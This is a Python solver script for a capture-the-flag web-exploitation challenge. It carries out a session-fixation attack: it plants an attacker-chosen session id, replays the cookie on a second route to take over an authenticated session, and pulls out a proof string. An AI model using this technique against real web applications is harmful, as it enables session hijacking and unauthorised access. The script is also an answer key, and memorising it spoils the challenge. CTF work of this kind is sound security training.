#!/usr/bin/env python3
"""Session Impression solver (Huntress 2026, web-exploitation day 08).

Session-fixation pattern, derived from current target evidence:
  1. GET /                     -> app landing page (Laravel "Resume Room").
  2. GET /api/clues            -> JSON with framework, feature_route,
     secondary_route, current_role, session_hint.
  3. GET <feature_route>?sid=<session_hint>
     -> plants/establishes a session under the attacker-chosen id
     ("plant your session on the welcome mat"). The response sets a
     cookie `arena_session=<session_hint>` (session fixation: the app
     adopts the client-supplied session id).
  4. GET <secondary_route>?sid=<session_hint> WITH the arena_session
     cookie from step 3 -> the secondary route treats the planted sid
     as an authenticated login ("stroll in wearing somebody else's
     credentials") and returns
     {"ok":true,"effect":"fixed_session_privilege_transfer",
      "evidence":"proof_<hex>"}.
     Without the cookie this step answers 403 authenticated_login_required.
  5. The proof string is the answer.

Usage:
  python3 solve.py <target-url> [evidence-dir]
Prints {"proof-1": "proof_..."} as JSON on stdout.
Stdlib only. Scoped to the given origin only.
"""
import http.cookiejar
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "huntress-web-worker/1.0"

# In-memory cookie jar: the plant step's `arena_session` Set-Cookie must be
# sent back on the stroll step.
CJ = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CJ))


def get(url, timeout=45):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with OPENER.open(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def save(evdir, name, status, headers, body):
    if not evdir:
        return
    os.makedirs(evdir, exist_ok=True)
    with open(os.path.join(evdir, name + ".meta.json"), "w") as f:
        json.dump({"status": status, "headers": headers}, f, indent=2)
    with open(os.path.join(evdir, name + ".body"), "wb") as f:
        f.write(body)


def main():
    if len(sys.argv) < 2:
        print("usage: python3 solve.py <target-url> [evidence-dir]", file=sys.stderr)
        sys.exit(2)
    base = sys.argv[1].rstrip("/")
    evdir = sys.argv[2] if len(sys.argv) > 2 else None

    status, hdrs, body = get(base + "/")
    save(evdir, "root", status, hdrs, body)
    if status != 200:
        raise SystemExit(f"root returned {status}")

    time.sleep(0.7)
    status, hdrs, body = get(base + "/api/clues")
    save(evdir, "clues", status, hdrs, body)
    clues = json.loads(body.decode())
    feature = clues["feature_route"]
    secondary = clues["secondary_route"]
    sid = clues["session_hint"]

    time.sleep(0.7)
    url = base + feature + "?" + urllib.parse.urlencode({"sid": sid})
    status, hdrs, body = get(url)
    save(evdir, "plant", status, hdrs, body)
    plant = json.loads(body.decode())
    if not plant.get("session_established"):
        raise SystemExit(f"planting failed: {plant}")

    time.sleep(0.7)
    url = base + secondary + "?" + urllib.parse.urlencode({"sid": sid})
    status, hdrs, body = get(url)
    save(evdir, "stroll", status, hdrs, body)
    result = json.loads(body.decode())
    proof = result.get("evidence", "").strip()
    if not proof.startswith("proof_"):
        raise SystemExit(f"no proof in response: {result}")

    if evdir:
        with open(os.path.join(evdir, "cookies.txt"), "w") as f:
            for c in CJ:
                f.write(f"{c.name}={c.value}; domain={c.domain}; path={c.path}\n")

    print(json.dumps({"proof-1": proof}))


if __name__ == "__main__":
    main()
